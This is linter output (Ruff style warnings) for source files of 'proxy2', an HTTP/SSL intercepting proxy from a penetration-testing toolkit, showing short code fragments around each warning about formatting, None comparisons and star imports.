UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:886:24
    |
884 |                         )
885 |
886 |             logger.dbg("Encoding response body to: {}".format(encToUse))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
887 |             res_body = self.encode_content_body(res_body, encToUse)
888 |             reskeys = [x.lower() for x in res.headers.keys()]
    |
help: Convert to f-string

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:888:38
    |
886 |             logger.dbg("Encoding response body to: {}".format(encToUse))
887 |             res_body = self.encode_content_body(res_body, encToUse)
888 |             reskeys = [x.lower() for x in res.headers.keys()]
    |                                      ^^^^^^^^^^^^^^^^^^^^^^^
889 |             if "content-length" in reskeys:
890 |                 del res.headers["Content-Length"]
    |
help: Remove `.keys()`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:902:12
    |
900 |             res_body = ""
901 |
902 |         if type(res_body) == str:
    |            ^^^^^^^^^^^^^^^^^^^^^
903 |             res_body = str.encode(res_body)
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:914:13
    |
913 |           if (
914 | /             plugins.IProxyPlugin.proxy2_metadata_headers["keep_alive_this_connection"]
915 | |             in res.headers.keys()
    | |_________________________________^
916 |           ):
917 |               self.request.connection.no_keep_alive = False
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:914:13
    |
913 |         if (
914 |             plugins.IProxyPlugin.proxy2_metadata_headers["keep_alive_this_connection"]
    |             ^^^^^^^
915 |             in res.headers.keys()
916 |         ):
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:921:13
    |
920 |           logger.info(
921 | /             "[RESPONSE] HTTP {} {}, length: {}, keep-alive: {}".format(
922 | |                 res.status, res.reason, len(res_body), ka
923 | |             ),
    | |_____________^
924 |               color=ProxyLogger.colors_map["yellow"],
925 |           )
    |
help: Convert to f-string

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:930:21
    |
929 |         for k, v in res_headers.items():
930 |             if k in plugins.IProxyPlugin.proxy2_metadata_headers.values():
    |                     ^^^^^^^
931 |                 continue
    |

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:943:25
    |
941 |                       del self.request.headers["Host"]
942 |                       if (
943 | /                         plugins.IProxyPlugin.proxy2_metadata_headers[
944 | |                             "override_host_header"
945 | |                         ]
946 | |                         in self.request.headers.keys()
    | |______________________________________________________^
947 |                       ):
948 |                           outbound_origin = self.request.headers[
    |
help: Remove `.keys()`

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:943:25
    |
941 |                     del self.request.headers["Host"]
942 |                     if (
943 |                         plugins.IProxyPlugin.proxy2_metadata_headers[
    |                         ^^^^^^^
944 |                             "override_host_header"
945 |                         ]
    |

F405 `plugins` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:949:29
    |
947 |                     ):
948 |                         outbound_origin = self.request.headers[
949 |                             plugins.IProxyPlugin.proxy2_metadata_headers[
    |                             ^^^^^^^
950 |                                 "override_host_header"
951 |                             ]
    |

F841 [*] Local variable `e` is assigned to but never used
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:957:35
    |
955 |                 self.save_handler(self.request, self.request.body, res, res_body_plain)
956 |
957 |         except BrokenPipeError as e:
    |                                   ^
958 |             logger.err("Broken pipe. Client must have disconnected/timed-out.")
    |
help: Remove assignment to unused variable `e`

SIM118 Use `key in dict` instead of `key in dict.keys()`
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:974:16
    |
972 |         )
973 |         for k in hop_by_hop:
974 |             if k in headers.keys():
    |                ^^^^^^^^^^^^^^^^^^^
975 |                 del headers[k]
976 |         return headers
    |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:979:20
    |
978 |     def encode_content_body(self, text, encoding):
979 |         logger.dbg("Encoding content to {}".format(encoding))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
980 |         data = text
981 |         if encoding == "identity":
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:996:28
    |
994 |             except Exception as e:
995 |                 # raise Exception('Could not compress Brotli stream: "{}"'.format(str(e)))
996 |                 logger.err('Could not compress Brotli stream: "{}"'.format(str(e)))
    |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
997 |         else:
998 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:999:24
     |
 997 |         else:
 998 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
 999 |             logger.err('Unknown Content-Encoding: "{}"'.format(encoding))
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1000 |         return data
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1003:20
     |
1002 |     def decode_content_body(self, data, encoding):
1003 |         logger.dbg("Decoding content from {}".format(encoding))
     |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1004 |         text = data
1005 |         if encoding == "identity":
     |
help: Convert to f-string

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1012:13
     |
1010 |                 with gzip.GzipFile(fileobj=_io) as f:
1011 |                     text = f.read()
1012 |             except:
     |             ^^^^^^
1013 |                 return data
1014 |         elif encoding == "deflate":
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1025:28
     |
1023 |             except Exception as e:
1024 |                 # raise Exception('Could not decompress Brotli stream: "{}"'.format(str(e)))
1025 |                 logger.err('Could not decompress Brotli stream: "{}"'.format(str(e)))
     |                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1026 |         else:
1027 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1028:24
     |
1026 |         else:
1027 |             # raise Exception("Unknown Content-Encoding: %s" % encoding)
1028 |             logger.err('Unknown Content-Encoding: "{}"'.format(encoding))
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1029 |         return text
     |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1046:17
     |
1044 |         def _parse_qsl(s):
1045 |             return "\n".join(
1046 |                 "%-20s %s" % (k, v) for k, v in parse_qsl(s, keep_blank_values=True)
     |                 ^^^^^^^^^^
1047 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1052:27
     |
1050 |               return
1051 |
1052 |           req_header_text = "%s %s %s\n%s" % (
     |  ___________________________^
1053 | |             req.method,
1054 | |             req.uri,
1055 | |             self.request_version,
1056 | |             req.headers,
1057 | |         )
     | |_________^
1058 |
1059 |           if res is not None:
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1062:16
     |
1060 |             reshdrs = res.headers
1061 |
1062 |             if type(reshdrs) == dict or "CaseInsensitiveDict" in str(type(reshdrs)):
     |                ^^^^^^^^^^^^^^^^^^^^^
1063 |                 reshdrs = ""
1064 |                 for k, v in res.headers.items():
     |

F405 `plugins` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1065:29
     |
1063 |                 reshdrs = ""
1064 |                 for k, v in res.headers.items():
1065 |                     if k in plugins.IProxyPlugin.proxy2_metadata_headers.values():
     |                             ^^^^^^^
1066 |                         continue
1067 |                     if k.lower().startswith("x-proxy2-"):
     |

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1069:32
     |
1067 |                     if k.lower().startswith("x-proxy2-"):
1068 |                         continue
1069 |                     reshdrs += "{}: {}\n".format(k, v)
     |                                ^^^^^^^^^^^^^^^^^^^^^^^
1070 |
1071 |             res_header_text = "%s %d %s\n%s" % (
     |
help: Convert to f-string

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1071:31
     |
1069 |                     reshdrs += "{}: {}\n".format(k, v)
1070 |
1071 |             res_header_text = "%s %d %s\n%s" % (
     |                               ^^^^^^^^^^^^^^
1072 |                 res.response_version,
1073 |                 res.status,
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1079:13
     |
1078 |         logger.trace(
1079 |             "==== REQUEST ====\n%s" % req_header_text,
     |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1080 |             color=ProxyLogger.colors_map["yellow"],
1081 |         )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1087:17
     |
1085 |             query_text = _parse_qsl(u.query)
1086 |             logger.trace(
1087 |                 "==== QUERY PARAMETERS ====\n%s\n" % query_text,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1088 |                 color=ProxyLogger.colors_map["green"],
1089 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1095:17
     |
1093 |             cookie = _parse_qsl(re.sub(r";\s*", "&", cookie))
1094 |             logger.trace(
1095 |                 "==== COOKIES ====\n%s\n" % cookie,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1096 |                 color=ProxyLogger.colors_map["green"],
1097 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1103:17
     |
1101 |             token = auth.split()[1].decode("base64")
1102 |             logger.trace(
1103 |                 "==== BASIC AUTH ====\n%s\n" % token,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1104 |                 color=ProxyLogger.colors_map["red"],
1105 |             )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1121:41
     |
1119 |                     else:
1120 |                         lines = json_str.splitlines()
1121 |                         req_body_text = "%s\n(%d lines)" % (
     |                                         ^^^^^^^^^^^^^^^^
1122 |                             "\n".join(lines[:50]),
1123 |                             len(lines),
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1132:21
     |
1130 |             if req_body_text:
1131 |                 logger.trace(
1132 |                     "==== REQUEST BODY ====\n%s\n" % req_body_text.strip(),
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1133 |                     color=ProxyLogger.colors_map["white"],
1134 |                 )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1138:17
     |
1136 |         if res is not None:
1137 |             logger.trace(
1138 |                 "\n==== RESPONSE ====\n%s" % res_header_text,
     |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1139 |                 color=ProxyLogger.colors_map["cyan"],
1140 |             )
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1144:20
     |
1142 |             cookies = res.headers.get("Set-Cookie")
1143 |             if cookies:
1144 |                 if type(cookies) == list or type(cookies) == tuple:
     |                    ^^^^^^^^^^^^^^^^^^^^^
1145 |                     cookies = "\n".join(cookies)
     |

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1144:45
     |
1142 |             cookies = res.headers.get("Set-Cookie")
1143 |             if cookies:
1144 |                 if type(cookies) == list or type(cookies) == tuple:
     |                                             ^^^^^^^^^^^^^^^^^^^^^^
1145 |                     cookies = "\n".join(cookies)
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1148:21
     |
1147 |                 logger.trace(
1148 |                     "==== SET-COOKIE ====\n%s\n" % cookies,
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1149 |                     color=ProxyLogger.colors_map["yellow"],
1150 |                 )
     |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1164:41
     |
1162 |                     else:
1163 |                         lines = json_str.splitlines()
1164 |                         res_body_text = "%s\n(%d lines)" % (
     |                                         ^^^^^^^^^^^^^^^^
1165 |                             "\n".join(lines[:50]),
1166 |                             len(lines),
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1171:20
     |
1169 |                     res_body_text = res_body
1170 |             elif content_type.startswith("text/html"):
1171 |                 if type(res_body) == str:
     |                    ^^^^^^^^^^^^^^^^^^^^^
1172 |                     res_body = str.encode(res_body)
1173 |                 m = re.search(
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1180:25
     |
1178 |                 if m:
1179 |                     logger.trace(
1180 |                         "==== HTML TITLE ====\n%s\n" % html.unescape(m.group(1)),
     |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1181 |                         color=ProxyLogger.colors_map["cyan"],
1182 |                     )
     |
help: Replace with format specifiers

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1191:24
     |
1189 |                 halfmax = int(maxchars / 2)
1190 |                 try:
1191 |                     if type(res_body_text) == bytes:
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1192 |                         dec = res_body_text.decode()
1193 |                     else:
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1196:31
     |
1194 |                         dec = res_body_text
1195 |
1196 |                     if dec != None and len(dec) > maxchars:
     |                               ^^^^
1197 |                         res_body_text2 = (
1198 |                             dec[:halfmax] + " <<< ... >>> " + dec[-halfmax:]
     |
help: Replace with `cond is not None`

F405 `hexdump` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1205:42
     |
1203 |                 except UnicodeDecodeError:
1204 |                     if len(res_body_text) > maxchars:
1205 |                         res_body_text2 = hexdump(list(res_body_text[:halfmax]))
     |                                          ^^^^^^^
1206 |                         res_body_text2 += "\n\t................\n"
1207 |                         res_body_text2 += hexdump(list(res_body_text[-halfmax:]))
     |

F405 `hexdump` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1207:43
     |
1205 |                         res_body_text2 = hexdump(list(res_body_text[:halfmax]))
1206 |                         res_body_text2 += "\n\t................\n"
1207 |                         res_body_text2 += hexdump(list(res_body_text[-halfmax:]))
     |                                           ^^^^^^^
1208 |                     else:
1209 |                         res_body_text2 = hexdump(list(res_body_text))
     |

F405 `hexdump` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1209:42
     |
1207 |                         res_body_text2 += hexdump(list(res_body_text[-halfmax:]))
1208 |                     else:
1209 |                         res_body_text2 = hexdump(list(res_body_text))
     |                                          ^^^^^^^
1210 |
1211 |                 logger.trace(
     |

UP031 Use format specifiers instead of percent format
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1212:21
     |
1211 |                 logger.trace(
1212 |                     "==== RESPONSE BODY ====\n%s\n" % res_body_text2,
     |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1213 |                     color=ProxyLogger.colors_map["green"],
1214 |                 )
     |
help: Replace with format specifiers

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1223:27
     |
1221 |             instance = self.plugins[plugin_name]
1222 |             try:
1223 |                 handler = getattr(instance, "request_handler")
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1224 |                 # logger.dbg("Calling `request_handler' from plugin %s" % plugin_name)
1225 |                 origheaders = dict(req.headers).copy()
     |
help: Replace `getattr` with attribute access

E711 Comparison to `None` should be `cond is None`
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1230:40
     |
1229 |                 altered = req_body != req_body_current and req_body_current is not None
1230 |                 if req_body_current == None:
     |                                        ^^^^
1231 |                     req_body_current = req_body
1232 |                 for k, v in origheaders.items():
     |
help: Replace with `cond is None`

B007 Loop control variable `v` not used within loop body
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1232:24
     |
1230 |                 if req_body_current == None:
1231 |                     req_body_current = req_body
1232 |                 for k, v in origheaders.items():
     |                        ^
1233 |                     if k not in req.headers.keys():
1234 |                         altered = True
     |
help: Rename unused `v` to `_v`

SIM118 Use `key not in dict` instead of `key not in dict.keys()`
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1233:24
     |
1231 |                     req_body_current = req_body
1232 |                 for k, v in origheaders.items():
1233 |                     if k not in req.headers.keys():
     |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^
1234 |                         altered = True
     |
help: Remove `.keys()`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1244:25
     |
1242 |                   if "object has no attribute" in str(e):
1243 |                       logger.dbg(
1244 | /                         'Plugin "{}" does not implement `request_handler\''.format(
1245 | |                             plugin_name
1246 | |                         )
     | |_________________________^
1247 |                       )
1248 |                       if options["debug"]:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1252:25
     |
1250 |                   else:
1251 |                       logger.err(
1252 | /                         "Plugin {} has thrown an exception: '{}'".format(
1253 | |                             plugin_name, str(e)
1254 | |                         )
     | |_________________________^
1255 |                       )
1256 |                       if options["debug"]:
     |
help: Convert to f-string

B009 [*] Do not call `getattr` with a constant attribute value. It is not any safer than normal property access.
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1268:27
     |
1266 |             instance = self.plugins[plugin_name]
1267 |             try:
1268 |                 handler = getattr(instance, "response_handler")
     |                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
1269 |                 # logger.dbg("Calling `response_handler' from plugin %s" % plugin_name)
1270 |                 origheaders = {}
     |
help: Replace `getattr` with attribute access

E722 Do not use bare `except`
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1273:17
     |
1271 |                 try:
1272 |                     origheaders = res.headers.copy()
1273 |                 except:
     |                 ^^^^^^
1274 |                     pass
     |

B007 Loop control variable `v` not used within loop body
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1279:24
     |
1278 |                 altered = res_body_current != res_body
1279 |                 for k, v in origheaders.items():
     |                        ^
1280 |                     if origheaders[k] != res.headers[k]:
1281 |                         # logger.dbg('Plugin modified response header: "{}", from: "{}" to: "{}"'.format(
     |
help: Rename unused `v` to `_v`

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1295:25
     |
1293 |                   if "object has no attribute" in str(e):
1294 |                       logger.dbg(
1295 | /                         'Plugin "{}" does not implement `response_handler\''.format(
1296 | |                             plugin_name
1297 | |                         )
     | |_________________________^
1298 |                       )
1299 |                   else:
     |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1301:25
     |
1299 |                   else:
1300 |                       logger.err(
1301 | /                         "Plugin {} has thrown an exception: '{}'".format(
1302 | |                             plugin_name, str(e)
1303 | |                         )
     | |_________________________^
1304 |                       )
1305 |                       if options["debug"]:
     |
help: Convert to f-string

N803 Argument name `VERSION` should be lowercase
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1344:16
     |
1344 | def init(opts, VERSION):
     |                ^^^^^^^
1345 |     global options
1346 |     global pluginsloaded
     |

E711 Comparison to `None` should be `cond is not None`
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1357:45
     |
1355 |     sslintercept = SSLInterception(logger, options)
1356 |
1357 |     if options["log"] and options["log"] != None and options["log"] != sys.stdout:
     |                                             ^^^^
1358 |         if options["tee"]:
1359 |             logger.info("Teeing stdout output to {} log file.".format(options["log"]))
     |
help: Replace with `cond is not None`

F405 `monkeypatching` may be undefined, or defined from star imports
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1363:5
     |
1361 |             logger.info("Writing output to {} log file.".format(options["log"]))
1362 |
1363 |     monkeypatching(logger)
     |     ^^^^^^^^^^^^^^
1364 |
1365 |     for name, plugin in pluginsloaded.get_plugins().items():
     |

B007 Loop control variable `name` not used within loop body
    --> security\penetration-testing-tools\web\proxy2\lib\proxyhandler.py:1365:9
     |
1363 |     monkeypatching(logger)
1364 |
1365 |     for name, plugin in pluginsloaded.get_plugins().items():
     |         ^^^^
1366 |         plugin.logger = logger
1367 |         plugin.help(None)
     |
help: Rename unused `name` to `_name`

N816 Variable `globalLock` in global scope should not be mixedCase
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:10:1
   |
 8 | import time
 9 |
10 | globalLock = threading.Lock()
   | ^^^^^^^^^^
   |

E711 Comparison to `None` should be `cond is not None`
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:41:23
   |
40 |     def __init__(self, options=None):
41 |         if options != None:
   |                       ^^^^
42 |             self.options.update(options)
   |
help: Replace with `cond is not None`

UP032 [*] Use f-string instead of `format` call
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:46:16
   |
44 |     @staticmethod
45 |     def with_color(c, s):
46 |         return "\x1b[1;{}m{}\x1b[0m".format(c, s)
   |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
47 |
48 |     # Invocation:
   |
help: Convert to f-string

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:52:19
   |
50 |     @staticmethod
51 |     def out(txt, fd, mode="info ", **kwargs):
52 |         if txt == None or fd == "none":
   |                   ^^^^
53 |             return
54 |         elif fd == None:
   |
help: Replace with `cond is None`

E711 Comparison to `None` should be `cond is None`
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:54:20
   |
52 |         if txt == None or fd == "none":
53 |             return
54 |         elif fd == None:
   |                    ^^^^
55 |             raise Exception("[ERROR] Logging descriptor has not been specified!")
   |
help: Replace with `cond is None`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:66:16
   |
64 |         if args["color"]:
65 |             col = args["color"]
66 |             if type(col) == str and col in ProxyLogger.colors_map.keys():
   |                ^^^^^^^^^^^^^^^^
67 |                 col = ProxyLogger.colors_map[col]
68 |         else:
   |

SIM118 Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:66:37
   |
64 |         if args["color"]:
65 |             col = args["color"]
66 |             if type(col) == str and col in ProxyLogger.colors_map.keys():
   |                                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
67 |                 col = ProxyLogger.colors_map[col]
68 |         else:
   |
help: Remove `.keys()`

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:77:20
   |
75 |         prefix = ""
76 |         if mode:
77 |             mode = "[%s] " % mode
   |                    ^^^^^^^^^^^^^^
78 |
79 |         if not args["noprefix"]:
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:81:51
   |
79 |         if not args["noprefix"]:
80 |             prefix = ProxyLogger.with_color(
81 |                 ProxyLogger.colors_dict["other"], "%s%s: " % (mode.upper(), tm)
   |                                                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
82 |             )
   |
help: Replace with format specifiers

SIM102 Use a single `if` statement instead of nested `if` statements
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:85:9
   |
84 |           nl = ""
85 | /         if "newline" in args:
86 | |             if args["newline"]:
   | |_______________________________^
87 |                   nl = "\n"
   |
help: Combine `if` statements using `and`

E721 Use `is` and `is not` for type comparisons, or `isinstance()` for isinstance checks
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:89:12
   |
87 |                 nl = "\n"
88 |
89 |         if type(fd) == str:
   |            ^^^^^^^^^^^^^^^
90 |             prefix2 = "%s%s: " % (mode.upper(), tm)
91 |             line = prefix2 + txt + nl
   |

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:90:23
   |
89 |         if type(fd) == str:
90 |             prefix2 = "%s%s: " % (mode.upper(), tm)
   |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
91 |             line = prefix2 + txt + nl
92 |             ProxyLogger.writeToLogfile(fd, line)
   |
help: Replace with format specifiers

SIM118 [*] Use `key in dict` instead of `key in dict.keys()`
  --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:94:16
   |
92 |             ProxyLogger.writeToLogfile(fd, line)
93 |
94 |             if "tee" in args.keys() and args["tee"]:
   |                ^^^^^^^^^^^^^^^^^^^^
95 |                 with globalLock:
96 |                     sys.stdout.write(prefix + ProxyLogger.with_color(col, txt) + nl)
   |
help: Remove `.keys()`

SIM117 [*] Use a single `with` statement with multiple contexts instead of nested `with` statements
   --> security\penetration-testing-tools\web\proxy2\lib\proxylogger.py:103:9
    |
101 |       @staticmethod
102 |       def writeToLogfile(fd, line):
103 | /         with globalLock:
104 | |             with open(fd, "a") as f:
    | |____________________________________^
105 |                   f.write(line)
106 |                   f.flush()
    |
help: Combine `with` statements

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:33:33
   |
31 |                 )
32 |                 self.options["certdir"] = path
33 |                 self.logger.dbg('Using path: "%s"' % self.options["certdir"])
   |                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
34 |
35 |             # Step 1: Create directory for certificates and asynchronous encryption keys
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:39:25
   |
37 |                   try:
38 |                       self.logger.dbg(
39 | /                         "Creating directory for certificate: '%s'"
40 | |                         % self.options["certdir"]
   | |_________________________________________________^
41 |                       )
42 |                       os.mkdir(self.options["certdir"])
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:45:25
   |
43 |                 except Exception as e:
44 |                     self.logger.fatal(
45 |                         "Couldn't make directory for certificates: '%s'" % e
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
46 |                     )
47 |                     return False
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:55:25
   |
53 |                 if not os.path.isdir(self.options["cakey"]):
54 |                     self.logger.dbg(
55 |                         "Creating CA key file: '%s'" % self.options["cakey"]
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
56 |                     )
57 |                     p = Popen(
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
  --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:80:25
   |
78 |                 if not os.path.isdir(self.options["cacert"]):
79 |                     self.logger.dbg(
80 |                         "Creating CA certificate file: '%s'" % self.options["cacert"]
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
81 |                     )
82 |                     p = Popen(
   |
help: Replace with format specifiers

UP031 Use format specifiers instead of percent format
   --> security\penetration-testing-tools\web\proxy2\lib\sslintercept.py:124:25
    |
122 |                 if not os.path.isdir(self.options["certkey"]):
123 |                     self.logger.dbg(
124 |                         "Creating Certificate key file: '%s'" % self.options["certkey"]
